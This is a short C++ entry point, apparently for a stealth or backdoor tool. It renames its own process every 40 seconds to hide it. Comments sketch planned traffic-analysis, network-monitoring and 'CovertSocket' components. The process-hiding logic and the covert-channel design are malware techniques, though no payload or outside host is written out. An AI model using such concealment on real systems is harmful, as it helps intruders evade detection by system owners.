#include <iostream>
#include <zconf.h>
#include "ProcessDistorter.h"
#include "../shared/Logger.h"

int main(int argc, char * argv[]) {

    Logger::setDebug(true);
    Logger::debug("Starting Up");

    ProcessDistorter * pd = new ProcessDistorter(argv, false, true);
    pd->determineProcessName();

    Logger::debug("Now Looping");
    while(1){
        usleep(40 * 1000000); // 40 seconds

        Logger::debug("Renaming");
        pd->determineProcessName();
        Logger::debug("Rename Complete");
    }

    //Create ProcessDistorter
    //Execute this immediately to hide process to something

    //Create TrafficAnalyzer

    //Create NetworkMonitor
    // - Pass TrafficAnalyzer

    //Create CovertSocket
    // - Pass TrafficAnalyzer

    //Create SystemState
    //Register All Components To SystemState

    //Manually set SystemState to 'FullCaution Mode'
    //Start SystemState Analysis

    //Start SystemState Looping

}